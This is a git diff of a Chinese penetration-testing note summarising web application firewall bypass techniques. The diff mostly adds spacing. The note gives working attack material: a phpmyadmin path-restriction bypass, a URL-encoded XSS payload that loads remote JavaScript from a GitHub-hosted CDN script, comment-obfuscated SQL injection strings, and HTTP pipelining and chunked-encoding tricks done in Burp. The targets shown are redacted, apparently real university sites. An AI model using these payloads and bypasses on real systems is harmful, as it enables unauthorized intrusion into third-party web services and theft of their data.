@@ -1,4 +1,4 @@
-# 绕waf总结
+# 绕 waf 总结
 
 ---
 
@@ -12,55 +12,58 @@
 
 ## 非默认端口导致完全绕过
 
-测试HTTPS服务
-测试8080/8081等端口的服务
+测试 HTTPS 服务
+测试 8080/8081 等端口的服务
 
 ## 路径限制绕过
 
-比如这只WAF会对访问敏感路径加以限制,但是加上参数可以绕过。
-比如想访问`xxx.██.edu.cn/phpmyadmin/`会被拦截,访问`xxx.██.edu.cn/phpmyadmin/?id=1`可以绕过
+比如这只 WAF 会对访问敏感路径加以限制,但是加上参数可以绕过。
 
-## XSS防护绕过
+比如想访问 `xxx.██.edu.cn/phpmyadmin/` 会被拦截,访问 `xxx.██.edu.cn/phpmyadmin/?id=1` 可以绕过
 
-最直白的 payload 类似`<script> alert('xss'); </script>`
-但是你可以用`<script src=来远程加载脚本,并绕过防护`
+## XSS 防护绕过
+
+最直白的 payload 类似 `<script> alert('xss'); </script>`
+但是你可以用 `<script src=来远程加载脚本,并绕过防护`
+
 `http://██.██.edu.cn/██/██?search=naive%22%3E%20%3Cmeta%20name=%22referrer%22%20content=%22never%22%20%3E%20%3Cscript%20src=%22https://cdn.jsdelivr.net/gh/TomAPU/xsstest/test.js%22%3E%3C/script%3E%20%3C!--`
 
 ## SQL 注入绕过
 
-Union注入时`union select 1 from 2`替换成`union/*fuckyou//*a*//*!select*/1/*fuckyou//*a*//*!from*/2`
-order by测试时直接把空格换成`/**//**/`
+Union 注入时 `union select 1 from 2` 替换成 `union/*fuckyou//*a*//*!select*/1/*fuckyou//*a*//*!from*/2`
+
+order by 测试时直接把空格换成 `/**//**/`
 
 ## 分段传输
 
-**利用pipline绕过**
+**利用 pipline 绕过**
 - **原理**
 
-    http协议是由tcp协议封装而来，当浏览器发起一个http请求时，浏览器先和服务器建立起连接tcp连接，然后发送http数据包（即我们用burpsuite截获的数据），其中包含了一个Connection字段，一般值为close，apache等容器根据这个字段决定是保持该tcp连接或是断开。当发送的内容太大，超过一个http包容量，需要分多次发送时，值会变成keep-alive，即本次发起的http请求所建立的tcp连接不断开，直到所发送内容结束Connection为close为止。
+    http 协议是由 tcp 协议封装而来，当浏览器发起一个 http 请求时，浏览器先和服务器建立起连接 tcp 连接，然后发送 http 数据包（即我们用 burpsuite 截获的数据），其中包含了一个 Connection 字段，一般值为 close，apache 等容器根据这个字段决定是保持该tcp连接或是断开。当发送的内容太大，超过一个 http 包容量，需要分多次发送时，值会变成 keep-alive，即本次发起的 http 请求所建立的 tcp 连接不断开，直到所发送内容结束 Connection 为 close 为止。
 
 - **测试**
 
-    关闭burp的Repeater的Content-Length自动更新，如图所示，点击红圈的Repeater在下拉选项中取消update Content-Length选中。这一步至关重要！！！
+    关闭 burp 的 Repeater 的 Content-Length 自动更新，如图所示，点击红圈的 Repeater 在下拉选项中取消 update Content-Length 选中。这一步至关重要！！！
     ![image](../../../img/渗透/笔记/绕waf总结/1.png)
 
-    burp截获post提交
+    burp 截获 post 提交
 
-    `id=1 and 1=1` 会被waf，将数据包复制一遍，如图
+    `id=1 and 1=1` 会被 waf，将数据包复制一遍，如图
 
     ![image](../../../img/渗透/笔记/绕waf总结/2.png)
 
-    接着修改第一个数据包的数据部分，即将`id=1+and+1%3D1` 修改为正常内容 `id=1`，再将数据包的 Content-Length 的值设置为修改后的 `id=1` 的字符长度即 4，最后将 Connection 字段值设为 keep-alive。提交后如图所示，会返回两个响应包，分别对应两个请求。
+    接着修改第一个数据包的数据部分，即将 `id=1+and+1%3D1` 修改为正常内容 `id=1`，再将数据包的 Content-Length 的值设置为修改后的 `id=1` 的字符长度即 4，最后将 Connection 字段值设为 keep-alive。提交后如图所示，会返回两个响应包，分别对应两个请求。
 
     ![image](../../../img/渗透/笔记/绕waf总结/3.png)
 
-    注意：从结果看，第一个正常数据包返回了正确内容，第二个包含有效载荷的数据包被某狗waf拦截，说明两数据包都能到达服务器，在面对其他waf时有可能可以绕过。无论如何这仍是一种可学习了解的绕过方法，且可以和接下来的方法进行组合使用绕过。
+    注意：从结果看，第一个正常数据包返回了正确内容，第二个包含有效载荷的数据包被某狗 waf 拦截，说明两数据包都能到达服务器，在面对其他 waf 时有可能可以绕过。无论如何这仍是一种可学习了解的绕过方法，且可以和接下来的方法进行组合使用绕过。
 
 **分块编码传输绕过**
 - **原理**
 
-    在头部加入 Transfer-Encoding: chunked 之后，就代表这个报文采用了分块编码。这时，post请求报文中的数据部分需要改为用一系列分块来传输。每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的，也不包括分块数据结尾的，且最后需要用0独占一行表示结束。
+    在头部加入 Transfer-Encoding: chunked 之后，就代表这个报文采用了分块编码。这时，post 请求报文中的数据部分需要改为用一系列分块来传输。每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的，也不包括分块数据结尾的，且最后需要用 0 独占一行表示结束。
 
-    开启上个实验中已关闭的content-length自动更新。给post请求包加入Transfer-Encoding: chunked后，将数据部分id=1 and 1=1进行分块编码（注意长度值必须为十六进制数），每一块里长度值独占一行，数据占一行如图所示。
+    开启上个实验中已关闭的 content-length 自动更新。给 post 请求包加入 Transfer-Encoding: chunked 后，将数据部分 `id=1 and 1=1` 进行分块编码（注意长度值必须为十六进制数），每一块里长度值独占一行，数据占一行如图所示。
     ![image](../../../img/渗透/笔记/绕waf总结/4.png)
 
     注意：分块编码传输需要将关键字 and,or,select ,union 等关键字拆开编码，不然仍然会被 waf 拦截。编码过程中长度需包括空格的长度。最后用 0 表示编码结束，并在 0 后空两行表示数据包结束，不然点击提交按钮后会看到一直处于 waiting 状态。
@@ -120,11 +123,11 @@ Content-Disposition: name="id"
 空行
 空行
 ```
-形式。如果不同时满足这四块的形式要求，payload将不会生效。
+形式。如果不同时满足这四块的形式要求，payload 将不会生效。
 
 **使用注释扰乱分块数据包**
 
-通过[RFC7230](https://tools.ietf.org/html/rfc7230)阅读规范发现分块传输可以在长度标识处加上分号“;”作为注释，如：
+通过 [RFC7230](https://tools.ietf.org/html/rfc7230) 阅读规范发现分块传输可以在长度标识处加上分号 `“;”` 作为注释，如：
 ```
 9;kkkkk
 1234567=1
